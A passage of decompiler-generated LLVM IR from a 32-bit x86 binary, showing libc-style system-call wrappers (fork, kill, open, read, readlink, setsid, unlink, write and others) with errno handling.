  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ae74 = load i32, i32* @edi, align 4
  store i32 %v0_804ae74, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804ae7c = load i32, i32* @ebx, align 4
  %v1_804ae84 = call i32 @close(i32 %arg1)
  store i32 %v0_804ae7c, i32* @ebx, align 4
  store i32 %v1_804ae84, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804ae84, -4095
  br i1 %tmp9, label %dec_label_pc_804ae9c, label %dec_label_pc_804ae90

dec_label_pc_804ae90:                             ; preds = %dec_label_pc_804ae74
  %v1_804ae90 = call i32 @function_804b330(i32 %v0_804ae7c)
  %v0_804ae95 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ae95 = sub i32 0, %v0_804ae95
  %v2_804ae97 = inttoptr i32 %v1_804ae90 to i32*
  store i32 %v1_804ae95, i32* %v2_804ae97, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804aea0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ae9c

dec_label_pc_804ae9c:                             ; preds = %dec_label_pc_804ae74, %dec_label_pc_804ae90
  %v2_804aea0 = phi i32 [ %v0_804ae74, %dec_label_pc_804ae74 ], [ %v2_804aea0.pre, %dec_label_pc_804ae90 ]
  %v0_804ae9d = phi i32 [ %v1_804ae84, %dec_label_pc_804ae74 ], [ -1, %dec_label_pc_804ae90 ]
  %v2_804ae9c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ae9c, i32* @edx, align 4
  store i32 %v2_804aea0, i32* @edi, align 4
  ret i32 %v0_804ae9d

; uselistorder directives
  uselistorder i32 %v1_804ae84, { 1, 0, 2 }
  uselistorder i32 %v0_804ae7c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ae9c, { 1, 0 }
}

define i32 @function_804aea2(i32 %arg1) local_unnamed_addr {
dec_label_pc_804aea2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804aea2 = load i32, i32* @ebx, align 4
  store i32 %v0_804aea2, i32* %stack_var_-4, align 4
  %v1_804aeab = call i32 @fork(i32 %v0_804aea2)
  store i32 %v1_804aeab, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804aeab, -4095
  br i1 %tmp7, label %dec_label_pc_804aec2, label %dec_label_pc_804aeb6

dec_label_pc_804aeb6:                             ; preds = %dec_label_pc_804aea2
  %v1_804aeb6 = call i32 @function_804b330(i32 %v0_804aea2)
  %v0_804aebb = load i32, i32* %ebx.global-to-local, align 4
  %v1_804aebb = sub i32 0, %v0_804aebb
  %v2_804aebd = inttoptr i32 %v1_804aeb6 to i32*
  store i32 %v1_804aebb, i32* %v2_804aebd, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804aec6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804aec2

dec_label_pc_804aec2:                             ; preds = %dec_label_pc_804aea2, %dec_label_pc_804aeb6
  %v2_804aec6 = phi i32 [ %v0_804aea2, %dec_label_pc_804aea2 ], [ %v2_804aec6.pre, %dec_label_pc_804aeb6 ]
  %v0_804aec3 = phi i32 [ %v1_804aeab, %dec_label_pc_804aea2 ], [ -1, %dec_label_pc_804aeb6 ]
  store i32 %v2_804aec6, i32* @ebx, align 4
  ret i32 %v0_804aec3

; uselistorder directives
  uselistorder i32 %v1_804aeab, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804aec2, { 1, 0 }
}

define i32 @function_804aec8() local_unnamed_addr {
dec_label_pc_804aec8:
  %stack_var_-8 = alloca i32, align 4
  %v2_804aecb = ptrtoint i32* %stack_var_-8 to i32
  %v2_804aed2 = call i32 @function_804af39(i32 7, i32 %v2_804aecb)
  store i32 256, i32* @edx, align 4
  %v2_804aedf = icmp slt i32 %v2_804aed2, 0
  br i1 %v2_804aedf, label %dec_label_pc_804aee7, label %dec_label_pc_804aee3

dec_label_pc_804aee3:                             ; preds = %dec_label_pc_804aec8
  %v3_804aee3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804aee3, i32* @edx, align 4
  br label %dec_label_pc_804aee7

dec_label_pc_804aee7:                             ; preds = %dec_label_pc_804aec8, %dec_label_pc_804aee3
  %v0_804aee7 = phi i32 [ 256, %dec_label_pc_804aec8 ], [ %v3_804aee3, %dec_label_pc_804aee3 ]
  ret i32 %v0_804aee7

; uselistorder directives
  uselistorder label %dec_label_pc_804aee7, { 1, 0 }
}

define i32 @function_804aeed() local_unnamed_addr {
dec_label_pc_804aeed:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804aeed = load i32, i32* @ebx, align 4
  store i32 %v0_804aeed, i32* %stack_var_-4, align 4
  %v1_804aef6 = call i32 @getpid(i32 %v0_804aeed)
  store i32 %v1_804aef6, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804aef6, -4095
  br i1 %tmp7, label %dec_label_pc_804af0d, label %dec_label_pc_804af01

dec_label_pc_804af01:                             ; preds = %dec_label_pc_804aeed
  %v1_804af01 = call i32 @function_804b330(i32 %v0_804aeed)
  %v0_804af06 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804af06 = sub i32 0, %v0_804af06
  %v2_804af08 = inttoptr i32 %v1_804af01 to i32*
  store i32 %v1_804af06, i32* %v2_804af08, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804af11.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804af0d

dec_label_pc_804af0d:                             ; preds = %dec_label_pc_804aeed, %dec_label_pc_804af01
  %v2_804af11 = phi i32 [ %v0_804aeed, %dec_label_pc_804aeed ], [ %v2_804af11.pre, %dec_label_pc_804af01 ]
  %v0_804af0e = phi i32 [ %v1_804aef6, %dec_label_pc_804aeed ], [ -1, %dec_label_pc_804af01 ]
  store i32 %v2_804af11, i32* @ebx, align 4
  ret i32 %v0_804af0e

; uselistorder directives
  uselistorder i32 %v1_804aef6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804af0d, { 1, 0 }
}

define i32 @function_804af13() local_unnamed_addr {
dec_label_pc_804af13:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804af13 = load i32, i32* @ebx, align 4
  store i32 %v0_804af13, i32* %stack_var_-4, align 4
  %v1_804af1c = call i32 @getppid(i32 %v0_804af13)
  store i32 %v1_804af1c, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804af1c, -4095
  br i1 %tmp7, label %dec_label_pc_804af33, label %dec_label_pc_804af27

dec_label_pc_804af27:                             ; preds = %dec_label_pc_804af13
  %v1_804af27 = call i32 @function_804b330(i32 %v0_804af13)
  %v0_804af2c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804af2c = sub i32 0, %v0_804af2c
  %v2_804af2e = inttoptr i32 %v1_804af27 to i32*
  store i32 %v1_804af2c, i32* %v2_804af2e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804af37.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804af33

dec_label_pc_804af33:                             ; preds = %dec_label_pc_804af13, %dec_label_pc_804af27
  %v2_804af37 = phi i32 [ %v0_804af13, %dec_label_pc_804af13 ], [ %v2_804af37.pre, %dec_label_pc_804af27 ]
  %v0_804af34 = phi i32 [ %v1_804af1c, %dec_label_pc_804af13 ], [ -1, %dec_label_pc_804af27 ]
  store i32 %v2_804af37, i32* @ebx, align 4
  ret i32 %v0_804af34

; uselistorder directives
  uselistorder i32 %v1_804af1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804af33, { 1, 0 }
}

define i32 @function_804af39(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804af39:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804af39 = load i32, i32* @ebx, align 4
  store i32 %v0_804af39, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804af4c = call i32 @int80_syscall(i32 191)
  store i32 %v1_804af4c, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804af4c, -4095
  br i1 %tmp9, label %dec_label_pc_804af65, label %dec_label_pc_804af59

dec_label_pc_804af59:                             ; preds = %dec_label_pc_804af39
  %v1_804af59 = call i32 @function_804b330(i32 %v0_804af39)
  %v0_804af5e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804af5e = sub i32 0, %v0_804af5e
  %v2_804af60 = inttoptr i32 %v1_804af59 to i32*
  store i32 %v1_804af5e, i32* %v2_804af60, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804af69.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804af65

dec_label_pc_804af65:                             ; preds = %dec_label_pc_804af39, %dec_label_pc_804af59
  %v2_804af69 = phi i32 [ %v0_804af39, %dec_label_pc_804af39 ], [ %v2_804af69.pre, %dec_label_pc_804af59 ]
  %v0_804af66 = phi i32 [ %v1_804af4c, %dec_label_pc_804af39 ], [ -1, %dec_label_pc_804af59 ]
  store i32 %v2_804af69, i32* @ebx, align 4
  ret i32 %v0_804af66

; uselistorder directives
  uselistorder i32 %v1_804af4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804af65, { 1, 0 }
}

define i32 @function_804af6b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804af6b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804af6b = load i32, i32* @ebx, align 4
  store i32 %v0_804af6b, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804af7e = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804af7e, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804af7e, -4095
  br i1 %tmp9, label %dec_label_pc_804af97, label %dec_label_pc_804af8b

dec_label_pc_804af8b:                             ; preds = %dec_label_pc_804af6b
  %v1_804af8b = call i32 @function_804b330(i32 %v0_804af6b)
  %v0_804af90 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804af90 = sub i32 0, %v0_804af90
  %v2_804af92 = inttoptr i32 %v1_804af8b to i32*
  store i32 %v1_804af90, i32* %v2_804af92, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804af9b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804af97

dec_label_pc_804af97:                             ; preds = %dec_label_pc_804af6b, %dec_label_pc_804af8b
  %v2_804af9b = phi i32 [ %v0_804af6b, %dec_label_pc_804af6b ], [ %v2_804af9b.pre, %dec_label_pc_804af8b ]
  %v0_804af98 = phi i32 [ %v2_804af7e, %dec_label_pc_804af6b ], [ -1, %dec_label_pc_804af8b ]
  %v2_804af97 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804af97, i32* @edx, align 4
  store i32 %v2_804af9b, i32* @ebx, align 4
  ret i32 %v0_804af98

; uselistorder directives
  uselistorder i32 %v2_804af7e, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804af97, { 1, 0 }
}

define i32 @function_804af9d(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804af9d:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804afa0 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804afa4 = sdiv i32 %sext, 16777216
  store i32 %v4_804afa4, i32* @ecx, align 4
  %v4_804afa8 = ptrtoint i8* %arg1 to i32
  %v3_804afac = and i32 %arg2, 64
  %v4_804afac = icmp eq i32 %v3_804afac, 0
  br i1 %v4_804afac, label %dec_label_pc_804afbd, label %dec_label_pc_804afb1

dec_label_pc_804afb1:                             ; preds = %dec_label_pc_804af9d
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804afbd

dec_label_pc_804afbd:                             ; preds = %dec_label_pc_804af9d, %dec_label_pc_804afb1
  %v0_804afbd = phi i32 [ 0, %dec_label_pc_804af9d ], [ %phitmp, %dec_label_pc_804afb1 ]
  store i32 %v0_804afbd, i32* @edx, align 4
  store i32 %v4_804afa8, i32* %ebx.global-to-local, align 4
  %v5_804afc8 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804afa4)
  store i32 %v5_804afc8, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804afc8, -4095
  br i1 %tmp15, label %dec_label_pc_804afe0, label %dec_label_pc_804afd4

dec_label_pc_804afd4:                             ; preds = %dec_label_pc_804afbd
  %v1_804afd4 = call i32 @function_804b330(i32 %v0_804afa0)
  %v0_804afd9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804afd9 = sub i32 0, %v0_804afd9
  %v2_804afdb = inttoptr i32 %v1_804afd4 to i32*
  store i32 %v1_804afd9, i32* %v2_804afdb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804afe0

dec_label_pc_804afe0:                             ; preds = %dec_label_pc_804afbd, %dec_label_pc_804afd4
  %v0_804afe3 = phi i32 [ %v5_804afc8, %dec_label_pc_804afbd ], [ -1, %dec_label_pc_804afd4 ]
  store i32 %v0_804afa0, i32* @ebx, align 4
  ret i32 %v0_804afe3

; uselistorder directives
  uselistorder i32 %v5_804afc8, { 1, 0, 2 }
  uselistorder i32 %v4_804afa4, { 1, 0 }
  uselistorder i32 %v0_804afa0, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804afe0, { 1, 0 }
  uselistorder label %dec_label_pc_804afbd, { 1, 0 }
}

define i32 @function_804afe8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804afe8:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804afe8 = load i32, i32* @edi, align 4
  store i32 %v0_804afe8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804aff8 = load i32, i32* @ebx, align 4
  %v4_804b000 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804aff8, i32* @ebx, align 4
  store i32 %v4_804b000, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804b000, -4095
  br i1 %tmp12, label %dec_label_pc_804b018, label %dec_label_pc_804b00c

dec_label_pc_804b00c:                             ; preds = %dec_label_pc_804afe8
  %v1_804b00c = call i32 @function_804b330(i32 %v0_804aff8)
  %v0_804b011 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b011 = sub i32 0, %v0_804b011
  %v2_804b013 = inttoptr i32 %v1_804b00c to i32*
  store i32 %v1_804b011, i32* %v2_804b013, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804b01c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b018

dec_label_pc_804b018:                             ; preds = %dec_label_pc_804afe8, %dec_label_pc_804b00c
  %v2_804b01c = phi i32 [ %v0_804afe8, %dec_label_pc_804afe8 ], [ %v2_804b01c.pre, %dec_label_pc_804b00c ]
  %v0_804b019 = phi i32 [ %v4_804b000, %dec_label_pc_804afe8 ], [ -1, %dec_label_pc_804b00c ]
  %v2_804b018 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b018, i32* @edx, align 4
  store i32 %v2_804b01c, i32* @edi, align 4
  ret i32 %v0_804b019

; uselistorder directives
  uselistorder i32 %v4_804b000, { 1, 0, 2 }
  uselistorder i32 %v0_804aff8, { 1, 0 }
  uselistorder label %dec_label_pc_804b018, { 1, 0 }
}

define i32 @function_804b01e() local_unnamed_addr {
dec_label_pc_804b01e:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b01e = load i32, i32* @edi, align 4
  store i32 %v0_804b01e, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v4_804b026 = inttoptr i32 %tmp3 to i8*
  %v0_804b02e = load i32, i32* @ebx, align 4
  %v1_804b02f = inttoptr i32 %tmp4 to i8*
  %v7_804b036 = call i32 @readlink(i8* %v1_804b02f, i8* %v4_804b026, i32 %tmp)
  store i32 %v0_804b02e, i32* @ebx, align 4
  store i32 %v7_804b036, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804b036, -4095
  br i1 %tmp11, label %dec_label_pc_804b04e, label %dec_label_pc_804b042

dec_label_pc_804b042:                             ; preds = %dec_label_pc_804b01e
  %v1_804b042 = call i32 @function_804b330(i32 %v0_804b02e)
  %v0_804b047 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b047 = sub i32 0, %v0_804b047
  %v2_804b049 = inttoptr i32 %v1_804b042 to i32*
  store i32 %v1_804b047, i32* %v2_804b049, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804b052.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b04e

dec_label_pc_804b04e:                             ; preds = %dec_label_pc_804b01e, %dec_label_pc_804b042
  %v2_804b052 = phi i32 [ %v0_804b01e, %dec_label_pc_804b01e ], [ %v2_804b052.pre, %dec_label_pc_804b042 ]
  %v0_804b04f = phi i32 [ %v7_804b036, %dec_label_pc_804b01e ], [ -1, %dec_label_pc_804b042 ]
  %v2_804b04e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b04e, i32* @edx, align 4
  store i32 %v2_804b052, i32* @edi, align 4
  ret i32 %v0_804b04f

; uselistorder directives
  uselistorder i32 %v7_804b036, { 1, 0, 2 }
  uselistorder i32 %v0_804b02e, { 1, 0 }
  uselistorder label %dec_label_pc_804b04e, { 1, 0 }
}

define i32 @function_804b054(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804b054:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b055 = load i32, i32* @esi, align 4
  store i32 %v0_804b055, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b06d = load i32, i32* @ebx, align 4
  %v1_804b075 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804b06d, i32* @ebx, align 4
  store i32 %v1_804b075, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804b075, -4095
  br i1 %tmp12, label %dec_label_pc_804b08d, label %dec_label_pc_804b081

dec_label_pc_804b081:                             ; preds = %dec_label_pc_804b054
  %v1_804b081 = call i32 @function_804b330(i32 %v0_804b06d)
  %v0_804b086 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b086 = sub i32 0, %v0_804b086
  %v2_804b088 = inttoptr i32 %v1_804b081 to i32*
  store i32 %v1_804b086, i32* %v2_804b088, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804b090.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804b08d

dec_label_pc_804b08d:                             ; preds = %dec_label_pc_804b054, %dec_label_pc_804b081
  %v2_804b090 = phi i32 [ %v0_804b055, %dec_label_pc_804b054 ], [ %v2_804b090.pre, %dec_label_pc_804b081 ]
  %v0_804b08e = phi i32 [ %v1_804b075, %dec_label_pc_804b054 ], [ -1, %dec_label_pc_804b081 ]
  store i32 %v2_804b090, i32* @esi, align 4
  ret i32 %v0_804b08e

; uselistorder directives
  uselistorder i32 %v1_804b075, { 1, 0, 2 }
  uselistorder i32 %v0_804b06d, { 1, 0 }
  uselistorder label %dec_label_pc_804b08d, { 1, 0 }
}

define i32 @function_804b093() local_unnamed_addr {
dec_label_pc_804b093:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b093 = load i32, i32* @ebx, align 4
  store i32 %v0_804b093, i32* %stack_var_-4, align 4
  %v1_804b09c = call i32 @setsid(i32 %v0_804b093)
  store i32 %v1_804b09c, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804b09c, -4095
  br i1 %tmp7, label %dec_label_pc_804b0b3, label %dec_label_pc_804b0a7

dec_label_pc_804b0a7:                             ; preds = %dec_label_pc_804b093
  %v1_804b0a7 = call i32 @function_804b330(i32 %v0_804b093)
  %v0_804b0ac = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b0ac = sub i32 0, %v0_804b0ac
  %v2_804b0ae = inttoptr i32 %v1_804b0a7 to i32*
  store i32 %v1_804b0ac, i32* %v2_804b0ae, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804b0b7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b0b3

dec_label_pc_804b0b3:                             ; preds = %dec_label_pc_804b093, %dec_label_pc_804b0a7
  %v2_804b0b7 = phi i32 [ %v0_804b093, %dec_label_pc_804b093 ], [ %v2_804b0b7.pre, %dec_label_pc_804b0a7 ]
  %v0_804b0b4 = phi i32 [ %v1_804b09c, %dec_label_pc_804b093 ], [ -1, %dec_label_pc_804b0a7 ]
  store i32 %v2_804b0b7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b0b4

; uselistorder directives
  uselistorder i32 %v1_804b09c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b0b3, { 1, 0 }
}

define i32 @function_804b0b9(i32* %arg1) local_unnamed_addr {
dec_label_pc_804b0b9:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804b0b9 = load i32, i32* @edi, align 4
  store i32 %v0_804b0b9, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804b0c1 = load i32, i32* @ebx, align 4
  %v2_804b0c9 = call i32 @time(i32* %arg1)
  store i32 %v0_804b0c1, i32* @ebx, align 4
  store i32 %v2_804b0c9, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_804b0c9, -4095
  br i1 %tmp10, label %dec_label_pc_804b0e1, label %dec_label_pc_804b0d5

dec_label_pc_804b0d5:                             ; preds = %dec_label_pc_804b0b9
  %v1_804b0d5 = call i32 @function_804b330(i32 %v0_804b0c1)
  %v0_804b0da = load i32, i32* %edi.global-to-local, align 4
  %v1_804b0da = sub i32 0, %v0_804b0da
  %v2_804b0dc = inttoptr i32 %v1_804b0d5 to i32*
  store i32 %v1_804b0da, i32* %v2_804b0dc, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804b0e5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b0e1

dec_label_pc_804b0e1:                             ; preds = %dec_label_pc_804b0b9, %dec_label_pc_804b0d5
  %v2_804b0e5 = phi i32 [ %v0_804b0b9, %dec_label_pc_804b0b9 ], [ %v2_804b0e5.pre, %dec_label_pc_804b0d5 ]
  %v0_804b0e2 = phi i32 [ %v2_804b0c9, %dec_label_pc_804b0b9 ], [ -1, %dec_label_pc_804b0d5 ]
  store i32 %v2_804b0e5, i32* @edi, align 4
  ret i32 %v0_804b0e2

; uselistorder directives
  uselistorder i32 %v2_804b0c9, { 1, 0, 2 }
  uselistorder i32 %v0_804b0c1, { 1, 0 }
  uselistorder label %dec_label_pc_804b0e1, { 1, 0 }
}

define i32 @function_804b0e7(i8* %arg1) local_unnamed_addr {
dec_label_pc_804b0e7:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b0e7 = load i32, i32* @edi, align 4
  store i32 %v0_804b0e7, i32* %stack_var_-4, align 4
  %v4_804b0eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b0eb, i32* %edi.global-to-local, align 4
  %v0_804b0ef = load i32, i32* @ebx, align 4
  %v3_804b0f7 = call i32 @unlink(i8* %arg1)
  store i32 %v3_804b0f7, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804b0f7, -4095
  br i1 %tmp9, label %dec_label_pc_804b10f, label %dec_label_pc_804b103

dec_label_pc_804b103:                             ; preds = %dec_label_pc_804b0e7
  %v1_804b103 = call i32 @function_804b330(i32 %v0_804b0ef)
  %v0_804b108 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b108 = sub i32 0, %v0_804b108
  %v2_804b10a = inttoptr i32 %v1_804b103 to i32*
  store i32 %v1_804b108, i32* %v2_804b10a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804b113.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b10f

dec_label_pc_804b10f:                             ; preds = %dec_label_pc_804b0e7, %dec_label_pc_804b103
  %v2_804b113 = phi i32 [ %v0_804b0e7, %dec_label_pc_804b0e7 ], [ %v2_804b113.pre, %dec_label_pc_804b103 ]
  %v0_804b110 = phi i32 [ %v3_804b0f7, %dec_label_pc_804b0e7 ], [ -1, %dec_label_pc_804b103 ]
  store i32 %v2_804b113, i32* %edi.global-to-local, align 4
  ret i32 %v0_804b110

; uselistorder directives
  uselistorder i32 %v3_804b0f7, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b10f, { 1, 0 }
}

define i32 @function_804b115(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b115:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b115 = load i32, i32* @edi, align 4
  store i32 %v0_804b115, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b125 = load i32, i32* @ebx, align 4
  %v4_804b12d = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804b125, i32* @ebx, align 4
  store i32 %v4_804b12d, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804b12d, -4095
  br i1 %tmp12, label %dec_label_pc_804b145, label %dec_label_pc_804b139

dec_label_pc_804b139:                             ; preds = %dec_label_pc_804b115
  %v1_804b139 = call i32 @function_804b330(i32 %v0_804b125)
  %v0_804b13e = load i32, i32* %edi.global-to-local, align 4
  %v1_804b13e = sub i32 0, %v0_804b13e
  %v2_804b140 = inttoptr i32 %v1_804b139 to i32*
  store i32 %v1_804b13e, i32* %v2_804b140, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804b149.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b145

dec_label_pc_804b145:                             ; preds = %dec_label_pc_804b115, %dec_label_pc_804b139
  %v2_804b149 = phi i32 [ %v0_804b115, %dec_label_pc_804b115 ], [ %v2_804b149.pre, %dec_label_pc_804b139 ]
  %v0_804b146 = phi i32 [ %v4_804b12d, %dec_label_pc_804b115 ], [ -1, %dec_label_pc_804b139 ]
  store i32 %v2_804b149, i32* @edi, align 4
  ret i32 %v0_804b146

; uselistorder directives
  uselistorder i32 %v4_804b12d, { 1, 0, 2 }
  uselistorder i32 %v0_804b125, { 1, 0 }
  uselistorder label %dec_label_pc_804b145, { 1, 0 }
}

define i32 @function_804b14b() local_unnamed_addr {
dec_label_pc_804b14b:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_804b14b = load i32, i32* @edi, align 4
  %v0_804b14c = load i32, i32* @esi, align 4
  %v0_804b14d = load i32, i32* @ebx, align 4
  %v12_804b14e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_804b155 = inttoptr i32 %tmp to i32*
  %v2_804b155 = load i32, i32* %v1_804b155, align 4
  %v12_804b155 = icmp eq i32 %v2_804b155, -1
  %v1_804b158 = icmp eq i1 %v12_804b155, false
  br i1 %v1_804b158, label %dec_label_pc_804b16a, label %dec_label_pc_804b15a

dec_label_pc_804b15a:                             ; preds = %dec_label_pc_804b14b
  %v1_804b15a = call i32 @function_804b330(i32 %v0_804b14d)
  %v1_804b15f = inttoptr i32 %v1_804b15a to i32*
  store i32 9, i32* %v1_804b15f, align 4
  br label %dec_label_pc_804b1b4

dec_label_pc_804b16a:                             ; preds = %dec_label_pc_804b14b
  %v1_804b16a = add i32 %tmp, 24
  store i32 %v12_804b14e, i32* @esi, align 4
  %v2_804b179 = call i32 @function_804c7b7(i32 %v12_804b14e, i32 134530996)
  %v1_804b181 = call i32 @function_804c7b4(i32 %v1_804b16a)
  store i32 %v1_804b181, i32* @eax, align 4
  %v0_804b186 = load i32, i32* @edi, align 4
  %v1_804b186 = inttoptr i32 %v0_804b186 to i32*
  %v2_804b186 = load i32, i32* %v1_804b186, align 4
  store i32 %v2_804b186, i32* @ebx, align 4
  store i32 -1, i32* %v1_804b186, align 4
  %v2_804b193 = call i32 @function_804c7b7(i32 %v12_804b14e, i32 1)
  %v0_804b199 = load i32, i32* @edi, align 4
  %v1_804b199 = add i32 %v0_804b199, 12
  %v2_804b199 = inttoptr i32 %v1_804b199 to i32*
  %v3_804b199 = load i32, i32* %v2_804b199, align 4
  %v1_804b19c = call i32 @function_804c193(i32 %v3_804b199)
